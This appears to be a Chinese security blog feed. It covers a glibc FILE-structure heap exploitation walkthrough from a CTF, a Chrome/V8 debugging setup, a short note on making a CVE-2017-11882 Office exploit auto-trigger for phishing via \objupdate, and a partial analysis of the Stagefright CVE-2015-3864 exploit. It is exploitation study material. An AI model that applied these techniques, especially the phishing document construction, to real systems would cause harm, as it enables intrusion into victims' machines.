<li><code>malloc(10)</code> 由于此时 <code>fastbin</code> , <code>smallbin</code> 均为空，所以会进入遍历 <code>unsorted bin</code> ，并根据相应的大小放到对应的 <code>bin</code> 中。上一步设置 <code>old_top</code> 大小为 <code>0x60</code> ， 所以在放置<code>old_top</code> 过程中，先通过  <code>unsorted bin attack</code> 修改 <code>io_list_all</code> 为 <code>fd也就是 main_arena-&gt;top</code> ， 然后 <code>old_top</code> 会被链到 <code>smallbin[5]</code> （大小为 0x60 ）, 接着继续遍历 <code>unsorted bin</code>，这一步 会 <code>abort</code>,原理下面说， 然后会遍历 <code>io_list_all</code> 调用 <code>_IO_OVERFLOW (fp, EOF)</code>. 伪造 <code>vtable</code>  getshell。</li>
</ul>
<p><strong>下面调试分析之</strong></p>
<p>参考断点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">break main</div><div class="line">bp genops.c:775</div><div class="line">bp  malloc.c:3472</div></pre></td></tr></table></figure>
<p>调试到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">23	     p2 = malloc(0x1000);</div></pre></td></tr></table></figure>
<p><code>top chunk</code> 的 <code>size</code> 已经被修改，<code>unsorted bin</code> 还是空的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512649343374w57z9tul.png?imageslim" alt="paste image"></p>
<p>单步步过，发现 <code>top</code> 已经被 添加到 <code>unsorted bin</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512649474593kp7jamb4.png?imageslim" alt="paste image"><br>然后就是一系列的伪造 <code>_IO_FILE_plus</code> 操作， 直接运行到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">62	     malloc(10);</div></pre></td></tr></table></figure></p>
<p>看看布局好后的结果</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512649649115pufiaajo.png?imageslim" alt="paste image"></p>
<p><code>vtable</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15126496905714c9muqxc.png?imageslim" alt="paste image"><br>可以看到 <code>__overflow</code> 被设置为 <code>winner</code> 函数，所以只要调用 <code>__overflow</code> 就会调用 <code>winner</code> 。</p>
<p>下面看看，怎么通过堆布局实现 <code>getshell</code></p>
<p>在 <code>malloc.c:3472</code> 下好断点，运行，会被断下来。</p>
<p>这里是遍历 <code>unsorted bin</code> 的流程。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512650027099nn0durlb.png?imageslim" alt="paste image"></p>
<p>会进入这里原因在于此时 <code>fastbin</code> , <code>smallbin</code> 均为空，不能满足分配的需求，接着就会进入这里。</p>
<p>这里会有一个 <code>check</code> ，过不去就会 <code>malloc_printerr</code> ，进而 <code>abort</code> 。 </p>
<p>第一次进入这里是可以过去的，然后会根据大小把 <code>victim</code> 放到合适的 <code>bin</code> 中，之前我们已经 把 <code>old_top</code> 的大小设置成了 <code>0x60</code>, 这里他就会被放到 <code>smallbin[5]</code> 里。</p>
<p>同时插入之前会先从<code>unsorted bin</code> 中 <code>unlink</code>  (unsorted bin attack) ,这时可以 往 <code>victim-&gt;bk + 0x10</code> 写入 <code>victim-&gt;fd</code>， 之前我们已经设置 <code>victim-&gt;bk 为 _IO_list_all-0x10</code>, 所以在这里就可以 修改 <code>_IO_list_all</code> 为 <code>main_arena-&gt;top</code></p>
<p>第一次遍历 <code>unsorted bin</code>, 从 <code>unsorted bin</code> 移除时的相关变量,内存数据。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512651092965lxj5dz39.png?imageslim" alt="paste image"></p>
<p>可以看到 <code>bck</code> 会成为<code>unsorted bin</code> 的起始位置，然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bck-&gt;fd = unsorted_chunks (av);</div></pre></td></tr></table></figure></p>
<p>而且此时 <code>bck-&gt;fd</code> 为 <code>_IO_list_all</code>。</p>
<p>继续运行，再次断在了 <code>malloc.c:3472</code>。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512651546282hwz6e5ug.png?imageslim" alt="paste image"></p>
<p>可以看到，此时的 <code>_IO_list_all</code> 已经被修改成了 <code>&lt;main_arena+88&gt;</code>, <code>old_top</code> 被放到了 <code>smallbin[5]</code>， 而且此时 <code>victim-&gt;size</code> 为0， 所以下面会进入 <code>abort</code> 的流程。</p>
<p>我们来看看，此时构造的 <code>_IO_list_all</code> 的内容</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512652089939d3g3frdi.png?imageslim" alt="paste image"></p>
<p><code>_IO_list_all</code> 偏移 <code>0x68</code> 为 <code>_chain</code> ，这也是之前设置 <code>old_top</code> 大小为 <code>0x60</code> 的原因。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1512652147336uaktzxn6.png?imageslim" alt="paste image"><br>这样就成功把 <code>old_top</code> 链入了 <code>_IO_list_all</code>。</p>
<p>下面看看该怎么拿 <code>shell</code><br>在 <code>abort</code> 函数中会调用 <code>fflush(null)</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512652347680zoy5v0u2.png?imageslim" alt="paste image"></p>
<p>实际调用的是 <code>_IO_flush_all_lockp</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512652528433f4lzgdak.png?imageslim" alt="paste image"></p>
<p>遍历 <code>_IO_list_all</code> 调用 <code>_IO_OVERFLOW (fp, EOF)</code>，其实就是调用 <code>fp-&gt;vtable-&gt;__overflow(fp,eof)</code></p>
<p>第一次执行循环时，可以看上面的 <code>_IO_list_all</code> 数据，发现进入不了 <code>_IO_OVERFLOW</code> 这个判断，所以<code>_IO_list_all</code> 第一项的 <code>vtable</code> 中的数据是坏的也没有关系。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512653250943jy3lqm1y.png?imageslim" alt="paste image"></p>
<p>第二次循环，通过 <code>fp = fp-&gt;_chain</code> 找到我们的 <code>old_top</code>, 我们已经在这布局好了数据。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512653351122a7sdg8oj.png?imageslim" alt="paste image"></p>
<p>运行 <code>getshell</code></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>FILE</code> 结构体是一个很好的攻击目标，学习一下很有必要<br>调试时，尽可能用最小的代码复现问题。</p>
<p>参考链接：</p>
<p><a href="http://www.evil0x.com/posts/13764.html" target="_blank" rel="external">http://www.evil0x.com/posts/13764.html</a></p>
<p><a href="https://securimag.org/wp/news/buffer-overflow-exploitation/" target="_blank" rel="external">https://securimag.org/wp/news/buffer-overflow-exploitation/</a></p>
<p><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="external">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a></p>
<p><a href="http://repo.thehackademy.net/depot_ouah/fsp-overflows.txt" target="_blank" rel="external">http://repo.thehackademy.net/depot_ouah/fsp-overflows.txt</a></p>
<p><a href="http://blog.angelboy.tw/" target="_blank" rel="external">http://blog.angelboy.tw/</a></p>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> file struct </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Play-with-chrome之环境搭建]]></title>
      <url>/2017/11/27/have_fun_with_chrome_part1.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>浏览器漏洞在 <code>APT</code> 攻击中用的比较多，而且这基本上是用户上网的标配了，所以研究浏览器的漏洞是十分有前景的，我认为。我选择 <code>chrome</code> 浏览器 ( <code>chromium</code>和 <code>chrome</code>之间的关系请自行百度 )为研究对象，主要原因如下： </p>
<ul>
<li>用户基数大，大量的用户使用 <code>chrome</code>  或者由 <code>chrome</code> 改装的浏览器。</li>
<li>安卓从 <code>4.4</code> 就已经开始使用 <code>chromium</code> 和 <code>v8</code> 作为 <code>webkit</code>，所以<code>chrome</code> 中的漏洞极有可能在 安卓上也有。</li>
</ul>
<p>工欲善其事，必先利其器 , 本文主要讲环境的搭建，包括 <code>chrome</code>的编译与调试 &amp;&amp; <code>v8</code> 引擎到的编译与调试。</p>
<p>测试环境</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Win10 64 位， Visual Studio 2015</div></pre></td></tr></table></figure>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="Chrome编译"><a href="#Chrome编译" class="headerlink" title="Chrome编译"></a>Chrome编译</h4><p><strong>Visual Studio 2015</strong></p>
<p>如果你有比较稳定（<strong>速度要快，不然得下特别久</strong>）的 <code>翻墙</code> 方案，可以直接按照官方的教程来。</p>
<p>在不能 <code>翻墙</code> 时，可以按照我的方案来。</p>
<p>首先下载下面的资源, 其中包括 <code>chrome 58</code> 的源代码， 以及编译时需要的工具。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">链接: https://pan.baidu.com/s/1qXMy19U 密码: 49kx</div></pre></td></tr></table></figure>
<p>然后下载安装 <code>Visual Studio 2015</code> , 在安装的时候除了 <code>移动开发相关</code> 的取消掉，其他的都选上，以免重来 , 要不然重新安装又得花特别长的时间。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511797573213lqdl1irn.png?imageslim" alt="paste image"></p>
<p>如果系统语言是 <code>中文</code> 的话还需要，修改 <code>非Unicode 程序的语言</code> 为 <code>英语(美国)</code>  , 如下图所示</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511797829186y0k8z77e.png?imageslim" alt="paste image"></p>
<p><strong>depot_tools</strong></p>
<p>然后解压 <code>depot_tools-2017-1-ALL.rar</code> 到一个目录，目录名不要有 <code>空格</code>, <code>中文</code> 。然后把目录添加到环境变量，后面编译时要用到。</p>
<p>比如我的 <code>depot_tools</code> 的目录是 <code>D:\depot_tools\depot_tools</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15117981790191rhl9y6l.png?imageslim" alt="paste image"></p>
<p>然后新建一个 <code>DEPOT_TOOLS_WIN_TOOLCHAIN</code> 系统变量， 其值设为 <code>0</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511798411307ye1pwmcl.png?imageslim" alt="paste image"></p>
<p><strong>设置 chromium 源码</strong></p>
<p>首先解压 <code>chromium</code> 到一个目录，然后解压 <code>develop-for-Stable-chromium-58.0.3029.81.zip</code> 文件，然后拷贝相应文件夹到  <code>chromium</code> 源码目录，覆盖掉相应的文件夹。</p>
<p><strong>编译</strong></p>
<p>进入源码目录，执行命令，生成编译需要的文件和 <code>vs 2015</code> 的解决方案。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gn gen out/Default --args=&quot;enable_nacl=false&quot;</div><div class="line">gn args out/Default --ide=vs</div></pre></td></tr></table></figure>
<p>然后使用 <code>ninja</code> 编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ninja -C out\Default chrome</div></pre></td></tr></table></figure></p>
<p>如果没有问题，等几个小时就好了。然后会在 <code>out\Default</code> 下生成 <code>chrome.exe</code> 和相关的 <code>dll</code> 和  <code>pdb</code> 调试文件。</p>
<p><strong>调试</strong></p>
<p><strong>方案一</strong></p>
<p>使用 <code>Visual Studio 2015</code> 加载 <code>all.sln</code> 直接调试。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511800354896kkv4p42s.png?imageslim" alt="paste image"></p>
<p><strong>方案二</strong></p>
<p>用 <code>Visual Studio 2015</code> 会非常的慢， 可以使用 <code>windbg preview</code> 调试，图形化，而且快，也有 <code>windbg</code> 的强大功能</p>
<p><code>windbg preview</code> 可以在  <code>windows store</code> 下载</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512744068940bhb543ao.png?imageslim" alt="paste image"></p>
<p>打开点击 左上角 <code>文件</code>， 根据情况设置好即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512744193260miecf7qu.png?imageslim" alt="paste image"></p>
<p>这里以 调试 <code>node</code> 为例 （原因是 <code>node</code> 使用 <code>v8</code> ）</p>
<p>首先进入 <code>settings</code> 设置符号路径。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15127443375937hbphlup.png?imageslim" alt="paste image"><br>然后根据上上图设置调试的程序 和 参数。 点击 <code>ok</code> 运行之<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1512744412429sbp9bh3z.png?imageslim" alt="paste image"></p>
<p>设置断点，断点断下来后可以直接定位到源码（自己编译）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512745006342lg0jlhf3.png?imageslim" alt="paste image"><br>调试信息非常的直观</p>
<h3 id="编译-node"><a href="#编译-node" class="headerlink" title="编译 node"></a>编译 node</h3><p>有时漏洞是位于 <code>v8</code> 引擎里面的。 我们可以使用 <code>node</code> 或者 <code>d8</code>来调试 <code>v8</code> ，这样调试速度比较快。</p>
<p><code>node</code> 可以去 淘宝的 <a href="https://npm.taobao.org/mirrors/node" target="_blank" rel="external">镜像</a> 里面下载， 这样速度快。</p>
<p>下载完后，解压。如果是在 <code>windows</code> 下编译，先运行</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512746124924rwpwxyab.png?imageslim" alt="paste image"></p>
<p>生成 <code>vs</code> 解决方案，然后编译就行了。<br>如果在 <code>linux</code> 下 直接 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --debug &amp;&amp; make -j8</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> chrome </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn chrome </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2017-11882钓鱼样本构造]]></title>
      <url>/2017/11/23/CVE_2017_11882_Phishing_sample.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞详情：</p>
<p><a href="https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about" target="_blank" rel="external">https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about</a></p>
<p>最近的一个影响很广泛的漏洞。</p>
<p>据说影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Office 365</div><div class="line"></div><div class="line">Microsoft Office 2000      </div><div class="line"></div><div class="line">Microsoft Office 2003      </div><div class="line"></div><div class="line">Microsoft Office 2007 Service Pack 3</div><div class="line"></div><div class="line">Microsoft Office 2010 Service Pack 2</div><div class="line"></div><div class="line">Microsoft Office 2013 Service Pack 1</div><div class="line"></div><div class="line">Microsoft Office 2016</div></pre></td></tr></table></figure>
<p>exploit在 <code>github</code>已经有了。</p>
<p><a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="external">https://github.com/embedi/CVE-2017-11882</a></p>
<p>本文讲讲怎么构造一个实用的钓鱼脚本。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>打开 <code>exploit</code> 会自动弹 计算器。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511399246307qiyjz9df.png?imageslim" alt="paste image"><br>不过如果我们修改内容后，在保存就不能打开自动弹了，需要用户点击 <code>111</code> , 那个控件。于是有了此文。</p>
<p>修改后和修改前的 <code>exploit</code> 文件对比，通过看漏洞报告，我们知道漏洞出在 <code>Equation.3</code> 控件，我们在两个文件中搜索，看看这里是不是有什么不一样的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511399690986npwdipku.png?imageslim" alt="paste image"></p>
<p><code>\objupdate</code> 是用来自动加载 <code>ole</code> 对象的，没了这个就不能自动触发漏洞了。我们加上试试。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511399801316gzwpwr2m.png?imageslim" alt="paste image"></p>
<p>然后打开</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511399823795k69wxqv4.png?imageslim" alt="paste image"></p>
<p>ok.</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>通过<code>diff</code>, 找到问题所在。</p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> office漏洞 </tag>
            
            <tag> CVE-2017-11882 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2015-3864漏洞利用分析(exploit_from_google)]]></title>
      <url>/2017/11/21/cve_2015_3864_google_exploit.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接下来要学习安卓的漏洞利用相关的知识了，网上搜了搜，有大神推荐 <code>stagefright</code> 系列的漏洞。于是开干，本文分析的是 <code>google</code> 的 <code>exploit</code>. 本文介绍的漏洞是 <code>CVE-2015-3864</code> , 在 <code>google</code>的博客上也有对该 <code>exploit</code> 的研究。</p>
<p>我之前下载下来了:</p>
<p><code>pdf版本</code> 的链接：<a href="https://gitee.com/hac425/blog_data/blob/master/Project-Zero_-Stagefrightened_.pdf" target="_blank" rel="external">在这里</a></p>
<p><code>exploit</code> 的链接： <a href="https://www.exploit-db.com/exploits/38226/" target="_blank" rel="external">https://www.exploit-db.com/exploits/38226/</a></p>
<p>分析环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Android 5.1 nexus4</div></pre></td></tr></table></figure>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>这个漏洞是一个文件格式相关漏洞，是由 <code>mediaserver</code> 在处理 <code>MPEG4</code> 文件时所产生的漏洞，漏洞的代码位于 <code>libstagefright.so</code> 这个库里面。</p>
<p>要理解并且利用 <code>文件格式</code> 类漏洞，我们就必须要非常清楚的了解目标文件的具体格式规范。</p>
<h4 id="Part-1-文件格式学习"><a href="#Part-1-文件格式学习" class="headerlink" title="Part 1  文件格式学习"></a>Part 1  文件格式学习</h4><p>先来一张总体的格式图<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511308907505erev1a87.png?imageslim" alt="paste image"></p>
<p><code>mp4</code> 文件由 <code>box</code> 组成，图中那些 <code>free</code>, <code>stsc</code>等都是<code>box</code>, <code>box</code> 里也可以包含 <code>box</code> ,这种 <code>box</code> 就叫 <code>containerbox</code> .</p>
<ul>
<li><p>每个 <code>box</code> 前四个字节为 <code>box</code> 的 <code>size</code> </p>
</li>
<li><p>第二个四字节为 <code>box</code> 的 <code>type</code>，<code>box type</code> 有 <code>ftyp,moov,trak</code> 等等好多种，<code>moov</code> 是 <code>containerbox</code> ,包含 <code>mvhd</code> 、<code>trak</code> 等  <code>box</code></p>
</li>
</ul>
<p>还有一些要注意的点。</p>
<ul>
<li><code>box</code> 中存储数据采用大端字节序存储</li>
<li>当 <code>size</code> 域为 0时，表示这是文件最后一个    <code>box</code></li>
<li>当 <code>size</code> 为1 时，表示这是一个 <code>large box</code> ,在 <code>type</code> 域后面的 <code>8 字节</code> 作为该 <code>box</code> 的长度。</li>
</ul>
<p>下面来看两个实例。</p>
<p><strong>实例一</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511309726966akyw40lg.png?imageslim" alt="paste image"></p>
<ul>
<li><code>size</code> 域为 <code>00000014</code>，所以该 <code>box</code>长度为 <code>0x14</code> 字节。</li>
<li><code>type</code> 域为 <code>66 74 79 70</code> 所以 <code>type</code> 为 <code>fytp</code></li>
<li>剩下的一些信息是一些与多媒体播放相关的一些信息。与漏洞利用无关，就不说了。</li>
</ul>
<p><strong>实例二</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15113100377113eokwnmp.png?imageslim" alt="paste image"></p>
<ul>
<li><code>size</code> 域为1，表示从该 <code>box</code> 开头偏移8字节开始的8字节为 <code>size</code> 字段， 所以该 <code>box</code> 的大小为 <code>0xFFFFFFFFFFFFFF88</code> </li>
<li><code>type</code> 为 <code>tx3g</code></li>
</ul>
<p>现在我们对该文件的格式已经有了一个大概的了解，这对于漏洞利用来说还不够，接下来我们要去看具体的解析该文件格式的代码是怎么实现的。</p>
<p>解析文件的具体代码位于 <code>MPEG4Extractor.cpp</code> 中的 <code>MPEG4Extractor::parseChunk</code> 函数里面。<br>该函数中的 <code>chunk</code> 对应的就是 <code>box</code>, 函数最开始先解析 <code>type</code> 和 <code>size</code> .<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">// 开始4字节为 box 大小， 后面紧跟的 4 字节为 box type</div><div class="line"></div><div class="line">   uint64_t chunk_size = ntohl(hdr[0]);</div><div class="line">   uint32_t chunk_type = ntohl(hdr[1]); //大端序转换</div><div class="line">   off64_t data_offset = *offset + 8; 	// 找到 box 数据区的偏移</div><div class="line"></div><div class="line">// 如果size区为1， 那么后面8字节作为size</div><div class="line">   if (chunk_size == 1) &#123;</div><div class="line">       if (mDataSource-&gt;readAt(*offset + 8, &amp;chunk_size, 8) &lt; 8) &#123;</div><div class="line">           return ERROR_IO;</div><div class="line">       &#125;</div><div class="line">       chunk_size = ntoh64(chunk_size);</div><div class="line">       data_offset += 8;</div><div class="line"></div><div class="line">       if (chunk_size &lt; 16) &#123;</div><div class="line">           // The smallest valid chunk is 16 bytes long in this case.</div><div class="line">           return ERROR_MALFORMED;</div><div class="line">       &#125;</div><div class="line">   &#125; else if (chunk_size &lt; 8) &#123;</div><div class="line">       // The smallest valid chunk is 8 bytes long.</div><div class="line">       return ERROR_MALFORMED;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
<p>通过注释和代码，我们知道对于  <code>size</code> 的处理和前面所述是一致的。然后就会根据不同的 <code>chunk_type</code> ,进入不同的逻辑，<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511313213505jmd3szla.png?imageslim" alt="paste image"></p>
<p>如果 <code>box</code> 中还包含 <code>子 box</code> 就会递归调用该函数进行解析。</p>
<h4 id="Part-2-漏洞分析"><a href="#Part-2-漏洞分析" class="headerlink" title="Part 2 漏洞分析"></a>Part 2 漏洞分析</h4><p><code>CVE-2015-3864</code>  漏洞产生的原因是，在处理 <code>tx3g box</code>时，对于获取的 <code>size</code> 字段处理不当，导致分配内存时出现整数溢出，进而造成了堆溢出。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511313757977irc4emw4.png?imageslim" alt="paste image"></p>
<p><code>size</code> 为之前所解析的所有 <code>tx3g box</code> 的长度总和。<code>chunk_size</code> 为当前要处理的 <code>tx3g box</code> 的长度。然后 <code>size + chunk_size</code> 计算要分配的内存大小。 <code>chunk_size</code> 是 <code>uint64_t</code> 类型的，<code>chunk_size</code> 我们在文件格式中我们所能控制的最大大小为 <code>0xFFFFFFFFFFFFFFFF</code> ( 看 <code>part1</code> 实例二 ) ，也是 <code>64</code> 位，但是我们还有一个 <code>size</code> 为可以控制，这样一相加，就会造成 <code>整数溢出</code> ， 导致分配小内存。而我们的 <strong>数据大小则远远大于分配的内存大小，进而造成堆溢出</strong>。</p>
<h4 id="Part-3-漏洞利用"><a href="#Part-3-漏洞利用" class="headerlink" title="Part 3 漏洞利用"></a>Part 3 漏洞利用</h4><p><strong>概述</strong></p>
<p>现在我们已经拥有了堆溢出的能力，如果是在 <code>ptmalloc</code> 中，可以修改下一个堆块的元数据来触发 <code>crash</code> ，甚至可能完成漏洞利用。不过从 <code>android 5</code>开始，安卓已经开始使用 <code>jemalloc</code> 作为默认的堆分配器。</p>
<p>在 <code>jemalloc</code> 中，小内存分配采用 <code>regions</code> 进行分配， <code>region</code> 之间是没有 <strong>元数据</strong> 的 （具体可以去网上搜 <code>jemalloc</code> 的分析的文章），所以 在 <code>ctf</code> 中常见的通过修改 <strong>堆块元数据</strong> 的漏洞利用方法在这里是没法用了。</p>
<p>不过所有事情都有两面性。<code>region</code> 间是直接相邻的，那我就可以很方便的修改相邻内存块的数据。 如果我们在 <code>tx3g</code> 对应内存块的后面放置一个含有关键数据结构的内存块，比如一个对象，在 <code>含有虚函数</code> 的类的 <code>对象</code> 的 <code>开始4字节（32位下）</code>，会存放一个 <code>虚表指针</code> .</p>
<p>在 <code>对象</code> 调用 <code>虚函数</code> 时会从 <code>虚表指针</code> 指向的位置的 <code>某个偏移（不同函数，偏移不同）</code> 处取到相应的函数指针，然后跳过去执行。</p>
<p>如果我们修改对象的虚表指针，我们就有可能在程序调用虚函数时，控制程序的流程。</p>
<p><strong>一些重要的 chunk_type(box type)</strong></p>
<p><strong>tx3g box</strong></p>
<p>上一节提到，我们可以修改对象的虚表指针，以求能够控制程序的跳转。那我们就需要找到一个能够在解析 <code>box</code> 数据能时分配的对象。</p>
<p><code>MPEG4DataSource</code> 就是这样一个类。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511319727633yo0eb9f8.png?imageslim" alt="paste image"></p>
<p>可以看到该对象继承自 <code>DataSource</code>, 同时还有几个虚函数。</p>
<p>我们可以在ida中看看虚表的构成。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511319976562k70bssgz.png?imageslim" alt="paste image"></p>
<p>可以看到 <code>readAt</code> 方法在虚表的第7项，也就是虚表偏移 <code>0x1c</code> 处。同时<code>MPEG4DataSource</code>在我这的大小为 <code>0x20</code> .再看一下漏洞位置的代码。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511313757977irc4emw4.png?imageslim" alt="paste image"><br>可以看到如果当前解析的 <code>tx3g</code> box 不是第一个<code>tx3g</code> box（即size&gt;0），会先调用 <code>memcpy</code> , 把之前所有 <code>tx3g</code> box中的数据拷贝到刚刚分配的内存。</p>
<p>如果我们先构造一个 <code>tx3g</code> ，其中包含的数据大于 <code>0x20</code>, 然后在构造一个 <code>tx3g</code> 构造大小使得 <code>size+chunk_size = 0x20</code>, 然后通过 <code>memcpy</code> 就可以覆盖 <code>MPEG4DataSource</code> 的虚表了。<code>exploit</code> 中就是这样干的。</p>
<p><strong>pssh box</strong></p>
<p>看看代码</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511321133430whaf4w9j.png?imageslim" alt="paste image"><br>划线位置说明了 <code>pssh</code> 的结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">pssh 的结构</div><div class="line">开始8字节 表示 该 box 的性质</div><div class="line"></div><div class="line">00 00 00 40 70 73 73 68</div><div class="line">size: 0x40, </div><div class="line">type: pssh :</div><div class="line">+ 0xc 开始 16字节 为 pssh.uuid</div><div class="line">+ 0x1c开始4字节为 pssh.datalen</div><div class="line">+ 0x20 开始为 pssh.data</div><div class="line">可以查看 代码，搜索关键字： FOURCC(&apos;p&apos;, &apos;s&apos;, &apos;s&apos;, &apos;h&apos;)</div></pre></td></tr></table></figure>
<p>这里先分配 <code>pssh.datalen</code> 大小的内存，然后把 <code>pssh.data</code> 拷贝到刚刚分配的内存。完了之后会把 分配到的 <code>PsshInfo</code> 结构体增加到 类属性值 <code>Vector&lt;PsshInfo&gt; mPssh</code> 中, <code>mPssh</code> 在 <code>MPEG4Extractor::~MPEG4Extractor()</code>中才会被释放。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511321832880rsre9xy0.png?imageslim" alt="paste image"></p>
<p>所以在解析完 <code>MPEG4</code>格式前，通过 <code>pssh</code> 分配的内存会一直在内存中。</p>
<p><strong>avcC box 和 hvcC box</strong><br>这两个 <code>box</code> 的处理基本一致，以 <code>avcC</code> 为例进行介绍。解析代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">     case FOURCC(&apos;a&apos;, &apos;v&apos;, &apos;c&apos;, &apos;C&apos;):</div><div class="line">     &#123;</div><div class="line">     	// 这是一块临时分配， buffer 为智能指针，在 函数返回时相应内存会被释放。</div><div class="line">         sp&lt;ABuffer&gt; buffer = new ABuffer(chunk_data_size);</div><div class="line">         if (mDataSource-&gt;readAt(</div><div class="line">                     data_offset, buffer-&gt;data(), chunk_data_size) &lt; chunk_data_size) &#123;</div><div class="line">             return ERROR_IO;</div><div class="line">         &#125;</div><div class="line">// 